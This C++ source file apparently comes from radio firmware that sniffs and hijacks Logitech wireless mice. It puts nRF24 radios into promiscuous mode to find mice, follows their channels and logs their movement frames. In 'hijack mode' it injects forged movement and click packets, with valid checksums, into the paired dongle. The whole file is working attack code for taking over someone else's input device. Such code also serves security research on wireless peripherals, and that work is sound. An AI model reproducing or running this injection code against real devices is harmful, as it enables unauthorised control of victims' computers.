#include "radio_manager.h"
#include "sd.h"
#include "led.h"
#include "nes_buttons.h"

// Logitech static paylods
static uint8_t end_transaction_frame[10] = { 0x00, 0x4F, 0x00, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00 };
static uint8_t ping_frame[2] = { 0x00, 0x00 };
static uint8_t keepalive_frame[5] = { 0x00, 0x40, 0x00, 0x6E, 0x00 };

// Constructor
radio_manager::radio_manager() :
  m_last_retune(0),
  m_dwell_time(1500),
  m_mouse_count(0),
  m_next_channel_index(0),
  m_last_tx_payload_length(0)
{
  // Setup the radios
  for(int x = 0; x < radio_count; x++)
  {
    radios[x] = radio(radio_pins[x][0], radio_pins[x][1]);
  }

  // Initial radio configuration
  for(int x = 0; x < radio_count; x++)
  {
    // Enter promiscuous mode and tune the radio
    radios[x].enter_promiscuous_mode();
    radios[x].channel(channels[x]);
  }
}

// Perform requisite actions on each radio
void radio_manager::tick()
{
  // Hijack mode
  if(m_hijack_mode)
  {
    // Hijack mode loop
    hijack_loop();
  }

  // Normal mode
  else
  {
    // Update promiscuous/following modes
    update_radio_modes();

    // Tune radios
    tune_radios();

    // Process received payloads
    process_payloads();
  }

  // Process button presses
  process_button_presses();
}

// Hijack mode loop
void radio_manager::hijack_loop()
{
  uint8_t buffer[32];

  uint64_t movement_elapsed = millis() - m_hijack_mouse->last_movement_packet_time_tx;
  uint64_t end_tx_elapsed = millis() - m_hijack_mouse->last_end_tx_packet_time_tx;
  if(movement_elapsed >= 5 && movement_elapsed <= 10 && end_tx_elapsed >= 2)
  {
      if(radios[1].transmit_payload(end_transaction_frame, 10, 1, 5, "End TX"))
      {
        m_hijack_mouse->pending_movement = false;
        m_hijack_mouse->pending_movement_time = millis();
        m_hijack_mouse->last_end_tx_packet_time_tx = millis();
      }
  }

  // Read and process any payloads on radio 0, which is our sniffer
  nrf24_status status = radios[1].get_status();
  if(status.rx_data_pipe < 0x06)
  {
    // Read in the payload - dynamic length
    uint8_t length;
    radios[1].read_payload_dynamic(buffer, length);
    process_payload_sniffer(m_hijack_mouse->address.bytes, buffer, length, radios[1].channel());
  }

  uint64_t elapsed_tx = millis() - m_hijack_mouse->last_packet_time_tx;

  // If we haven't received or transmitted and frames in the
  // the last 200ms, perform a channel sweep to make sure we're
  // still on the correct channel.
  uint64_t elapsed = millis() - m_hijack_mouse->last_packet_time();
  if(elapsed_tx > 150)
  {
    for(int x = 0; x < channel_count; x++)
    {
      radios[1].channel(channels[x]);
      if(radios[1].transmit_payload(ping_frame, 2, 0, 1, "Sweep Ping"))
      {
        if(channels[x] != m_hijack_mouse->channel)
        {
          m_hijack_mouse->channel = channels[x];
          m_hijack_mouse->last_tune_time = millis();
          m_hijack_mouse->last_packet_time_tx = millis();
        }
        break;
      }
    }
  }

  // Update the RX channels
  uint8_t mouse_channel = m_hijack_mouse->channel;
  if(radios[1].channel() != mouse_channel) radios[1].channel(mouse_channel);

  if(elapsed_tx > 100)
  {
    m_last_tx_payload_length = 5;
    memcpy(m_last_tx_payload, keepalive_frame, 5);

    if(radios[1].transmit_payload(keepalive_frame, 5, 1, 5, "Keepalive"))
    {
      m_hijack_mouse->last_packet_time_tx = millis();
    }
  }

  return;
}

// Enter hijack mode
void radio_manager::enter_hijack_mode(logitech_mouse * mouse)
{
  m_hijack_mode = true;
  m_hijack_mouse = mouse;

  radios[1].follow_mouse(m_hijack_mouse);
  radios[1].channel(m_hijack_mouse->channel);

  // Build the end transaction frame
  // end_transaction_frame[0] = m_hijack_mouse->address.bytes[0];
  end_transaction_frame[9] = 0;
  for(int b = 0; b < 9; b++) end_transaction_frame[9] -= end_transaction_frame[b];

  // Build the keepalive frame
  keepalive_frame[4] = 0;
  for(int b = 0; b < 4; b++) keepalive_frame[4] -= keepalive_frame[b];

  // Clear the NES button states
  for(int x = 0; x < nes_button_count; x++)
  {
    button_ticks[x] = 0;
  }
}

// Enter normal mode
void radio_manager::enter_normal_mode()
{
  m_hijack_mode = false;
  for(int x = 0; x < radio_count; x++)
  {
    radios[x].following(false);
    radios[x].enter_promiscuous_mode();
    radios[x].channel(channels[x]);
  }
}

// Process button presses
void radio_manager::process_button_presses()
{
  // Toggle hijacking on/off for the selected mouse
  if(button_clicks[NES_SELECT] > 0)
  {
    button_clicks[NES_SELECT] = 0;
    if(m_hijack_mode)
    {
      // Leave hijack mode
      enter_normal_mode();
    }
    else
    {
      // Enter hijack mode
      for(int x = 0; x < radio_count; x++)
      {
        if(radios[x].mouse()->selected && radios[x].following())
        {
          enter_hijack_mode(radios[x].mouse());
          break;
        }
      }
    }
  }

  // If we're in hijack mode, send movement frames
  if(m_hijack_mode)
  {
    // Get the time elapsed since the last RX or TX frame
    uint64_t rx_elapsed = millis() - m_hijack_mouse->last_packet_time_rx;
    uint64_t tx_elapsed = millis() - m_hijack_mouse->last_packet_time_tx;

    // Only transmit a packet if we're not expecting the mouse to send something
    if(((rx_elapsed >= 10 && rx_elapsed <= 90) || (rx_elapsed > 110 && rx_elapsed < 990) || (rx_elapsed > 1010))
      && tx_elapsed < 200 && tx_elapsed >= 4)
    {
      // Check for pending movement actions
      bool pending = false;
      for(int x = 0; x < nes_button_count; x++)
        if(button_ticks[x] > 0) { pending = true; break; }

      // Check for A/B button release
      if(m_left_down && button_ticks[NES_B] == 0) { pending = true; m_left_down = false; }
      if(m_right_down && button_ticks[NES_A] == 0) { pending = true; m_right_down = false; }

      // Wait until the previous end transaction frame before starting a new one
      if(pending /*&& !m_hijack_mouse->pending_movement*/)
      {
        unsigned char payload[10] = {0};

        // X and Y movement
        short x_rate, y_rate;
        x_rate = 1 * button_ticks[NES_RIGHT] - 1 * button_ticks[NES_LEFT];
        y_rate = 1 * button_ticks[NES_DOWN] - 1 * button_ticks[NES_UP];

        // This byte indicates a mouse movement/click frame
        payload[1] = 0xC2;

        // Button states
        payload[2] = 0;
        if(button_ticks[NES_B] > 0) { payload[2] |= button_left; m_left_down = true; }
        if(button_ticks[NES_A] > 0) { payload[2] |= button_right; m_right_down = true; }

        // Pack the X/Y rates into two 12-bit signed integers
        if (y_rate < 0) y_rate += 4096;
        if (x_rate < 0) x_rate += 4096;
        payload[4] = x_rate & 0xFF;
        payload[5] |= (x_rate >> 8) & 0x0F;
        payload[6] = y_rate >> 4;
        payload[5] |= (y_rate << 4) & 0xF0;

        // Add the checksum
        payload[9] = 0;
        for(int b = 0; b < 9; b++) payload[9] -= payload[b];
        m_last_tx_payload_length = 10;
        memcpy(m_last_tx_payload, payload, 10);

        // Transmit the moement payload
        if(radios[1].transmit_payload(payload, 10, 1, 5, "Movement"))
        {
          if(!m_hijack_mouse->pending_movement)
          {
            m_hijack_mouse->pending_movement = true;
            m_hijack_mouse->pending_movement_time = millis();
          }
          m_hijack_mouse->last_packet_time_tx = millis();
          m_hijack_mouse->last_movement_packet_time_tx = millis();

          // Cclear the button states
          for(int x = 0; x < nes_button_count; x++)
            button_ticks[x] = 0;
        }
      }
    }
  }

  // Normal mode
  else
  {
    // Mouse select - up / next
    if(button_clicks[NES_UP] > 0)
    {
      button_clicks[NES_UP] = 0;
      for(int x = 1; x < m_mouse_count; x++)
      {
        if(m_mice[x]->selected)
        {
          m_mice[x]->selected = false;
          m_mice[x-1]->selected = true;
        }
      }
    }

    // Mouse select - down / previous
    if(button_clicks[NES_DOWN] > 0)
    {
      button_clicks[NES_DOWN] = 0;
      for(int x = 0; x < m_mouse_count-1; x++)
      {
        if(m_mice[x]->selected)
        {
          m_mice[x]->selected = false;
          m_mice[x+1]->selected = true;
        }
      }
    }
  }
}

// Update promiscuous/following modes
void radio_manager::update_radio_modes()
{
  // Drop any stale sniffing radios back to promiscuous mode
  for(int x = 0; x < radio_count; x++)
  {
    if(radios[x].following())
    {
      // Check if the snfifer has timed out
      uint32_t elapsed = millis() - radios[x].mouse()->last_packet_time();
      if(elapsed > sniffer_timeout_ms)
      {
        radios[x].following(false);
        radios[x].enter_promiscuous_mode();
        radios[x].mouse()->followed = false;
        continue;
      }

      // Get the dongle address
      unsigned char dongle_address[address_length];
      memcpy(dongle_address, radios[x].mouse()->address.bytes, address_length);
      dongle_address[0] = 0;

      // If we haven't seen any frames from a mouse we're currently following
      // recently, but the sniffer hasn't timed out yet, do a short channel
      // sweep and see if get a ping response from the paired dongle
      if(elapsed > sniffer_sweep_timeout_ms)
      {
        // 1 byte ping payload
        uint8_t payload[] = { 0x0F };

        // If we aren't in hijack mode, only run a ping sweep once before the sniffer timeout
        if(millis() - radios[x].mouse()->last_sweep_time > sniffer_timeout_ms)
        {
          radios[x].mouse()->last_sweep_time = millis();

          // Ping the dongle on each channel
          for(int c = 0; c < channel_count; c++)
          {
            // Ping the mouse
            radios[x].channel(channels[c]);
            radios[x].enter_esb_tx_mode(dongle_address, 2 /* 2*250us=500us timeout */, 4 /* 4 retries */);
            if(radios[x].transmit_payload(payload, 1, 0, 2, "Ping"))
            {
              // Ping success, update the mouse channel
              if(channels[c] != radios[x].mouse()->channel)
              {
                radios[x].mouse()->channel = channels[c];
                radios[x].mouse()->last_tune_time = millis();
                radios[x].mouse()->last_packet_time_tx = millis();
              }
              break;
            }
          }

          // Return the radio to sniffer mode
          radios[x].enter_sniffer_mode(radios[x].mouse()->address.bytes);
        }
      }
    }
  }

  // Sniff any mice we've seen recently
  for(int x = 0; x < m_mouse_count; x++)
  {
    if(millis() - m_mice[x]->last_packet_time() < sniffer_timeout_ms)
    {
      for(int r = 0; r < radio_count; r++)
      {
        if(!radios[x].following())
        {
          radios[x].follow_mouse(m_mice[x]);
          m_mice[x]->followed = true;
          break;
        }
      }
    }
  }
}

// Tune radios
void radio_manager::tune_radios()
{
  // Check if it's time to tune the radios
  uint64_t tune_elapsed = millis() - m_last_retune;
  bool tune_now = tune_elapsed > m_dwell_time;
  if(tune_now)
  {
    m_last_retune = millis();

    // Step through the radios in promiscuous mode
    for(int x = 0; x < radio_count; x++)
    {
      if(!radios[x].following())
      {
        // Get the next channel to tune to
        uint8_t channel = channels[m_next_channel_index];
        m_next_channel_index = (m_next_channel_index + 1) % channel_count;

        // Tune the radio
        radios[x].channel(channel);
      }
    }
  }

  // Update the channels of any radios in sniffer mode
  for(int x = 0; x < radio_count; x++)
  {
    if(radios[x].following())
    {
      if(radios[x].channel() != radios[x].mouse()->channel)
      {
        radios[x].channel(radios[x].mouse()->channel);
      }
    }
  }
}

// Process a promiscuous mode payload
void radio_manager::process_payload_promiscuous(uint8_t * payload, uint8_t channel)
{
  // Get the address (reverse byte order)
  uint8_t address[5];
  address[0] = payload[4];
  address[1] = payload[3];
  address[2] = payload[2];
  address[3] = payload[1];
  address[4] = payload[0];

  // Check if this is a known mouse
  if(known_mouse(address))
  {
    update_mouse(address, channel);
    return;
  }

  // Read the payload length
  uint8_t payload_length = payload[5] >> 2;

  // Look for potential mouse data frames (10 bytes)
  if(payload_length == 10)
  {
    // Ignore addresses with 3 or more 0xAA, 0x55, 0x00, or 0xFF bytes
    int count = 0;
    for(int b = 0; b < address_length; b++)
      if(payload[b] == 0x00 || payload[b] == 0xFF || payload[b] == 0xAA || payload[b] == 0x55) count++;
    if(count < 3)
    {
      // Ignore addresses that end in 0x00 (dongles)
      if(payload[4] == 0x00) return;

      // Read the given CRC
      uint16_t crc_given;
      memcpy(&crc_given, &payload[6 + payload_length], 2);
      crc_given = (crc_given << 8) | (crc_given >> 8);
      crc_given <<= 1;
      crc_given = (crc_given << 8) | (crc_given >> 8);
      if(payload[8 + payload_length] & 0x80) crc_given |= 0x100;

      // Calculate the CRC
      uint16_t crc = 0xFFFF;
      for(int b = 0; b < 6 + payload_length; b++) crc = crc_update(crc, payload[b]);
      crc = crc_update(crc, payload[6 + payload_length] & 0x80, 1);
      crc = (crc << 8) | (crc >> 8);

      // Validate the CRC
      if(memcmp(&crc, &crc_given, 2) == 0)
      {
        // Get the ESB payload
        unsigned char esb_payload[32];
        for(int b = 0; b < payload_length; b++)
          esb_payload[b] = (payload[b + 6] << 1) | (payload[b + 7] >> 7);

        // Validate the Logitech checksum
        uint8_t sum = 0;
        for(int b = 0; b < payload_length - 1; b++) sum -= esb_payload[b];
        if(sum != esb_payload[payload_length-1]) return;

        // Check if it is a mouse movement frame
        if(esb_payload[1] == 0xC2)
        {
          // Add the mouse
          add_mouse(address, channel);
        }
      }
    }
  }
}

// Process a promiscuous mode payload
void radio_manager::process_payload_sniffer(uint8_t address[address_length], uint8_t * payload, uint8_t length, uint8_t channel)
{
  // Ignore the frame if it appears that we transmitted it
  if(m_last_tx_payload_length == length)
  {
    if(memcmp(payload, m_last_tx_payload, length) == 0)
    {
      return;
    }
  }

  // Validate the payload length
  if(length > 32 || length == 0) return;

  // Validate the Logitech checksum
  uint8_t sum = 0;
  for(int b = 0; b < length - 1; b++) sum -= payload[b];
  if(sum != payload[length-1]) return;
  length -= 1;

  // Update the mouse times and current channel
  update_mouse(address, channel);

  // Check for a movement frame
  if(payload[1] == 0xC2)
  {
    // Append this frame to the log
    append_log(address, payload);
  }

  printf("[%lu] ", millis());
  for(int x = 0; x < length; x++)
  {
    printf("%02X ", payload[x]);
  }
  printf("\n");
}

// Process received payloads
void radio_manager::process_payloads()
{
  // Received payload buffers
  uint8_t buffer[32];

  // Received payload buffer
  uint8_t buffer_length = 32;

  // Step through the radios
  for(int x = 0; x < radio_count; x++)
  {
    // Check if we have a payload available
    nrf24_status status = radios[x].get_status();
    if(status.rx_data_pipe < 0x06)
    {
      // Process the payload - promiscuous mode
      if(!radios[x].following())
      {
        // Read in the payload - 32 byte fixed length
        radios[x].read_payload_fixed(buffer);
        process_payload_promiscuous(buffer, radios[x].channel());
      }

      // Process the payload - sniffer mode
      if(radios[x].following())
      {
        // Read in the payload - dynamic length
        uint8_t length;
        radios[x].read_payload_dynamic(buffer, length);
        process_payload_sniffer(radios[x].mouse()->address.bytes, buffer, length, radios[x].channel());
      }
    }
  }
}

// Add a mouse in the observed mice list
void radio_manager::add_mouse(uint8_t address[address_length], uint8_t channel)
{
  // Add the mouse to the list
  if(!known_mouse(address))
  {
    m_mice[m_mouse_count++] = new logitech_mouse(address, channel);
    if(m_mouse_count == 1) m_mice[0]->selected = true; // auto-select the first mouse
    m_mice[m_mouse_count-1]->last_tune_time = millis();
  }

  // Create a blank movement log for the mouse if none exists
  create_log(address);
}

// Check if an address is a known mouse
bool radio_manager::known_mouse(uint8_t address[address_length])
{
  for(int x = 0; x < m_mouse_count; x++)
    if(m_mice[x]->address == address) return true;
  return false;
}

// Process a crc byte (or partial byte)
uint16_t radio_manager::crc_update (uint16_t crc, uint8_t data, uint8_t bits)
{
  crc = crc ^ ((uint16_t)data << 8);
  for (int x = 0; x < bits; x++)
  {
    if(crc & 0x8000) crc = (crc << 1) ^ 0x1021;
    else crc <<= 1;
  }
  return crc;
}

// Update the current channel of a mouse
void radio_manager::update_mouse(uint8_t address[address_length], uint8_t channel, bool tx)
{
  for(int x = 0; x < m_mouse_count; x++)
  {
    if(m_mice[x]->address == address)
    {
      if(m_mice[x]->channel != channel) m_mice[x]->last_tune_time = millis();
      m_mice[x]->channel = channel;
      if(tx) m_mice[x]->last_packet_time_tx = millis();
      else m_mice[x]->last_packet_time_rx = millis();
      return;
    }
  }
}
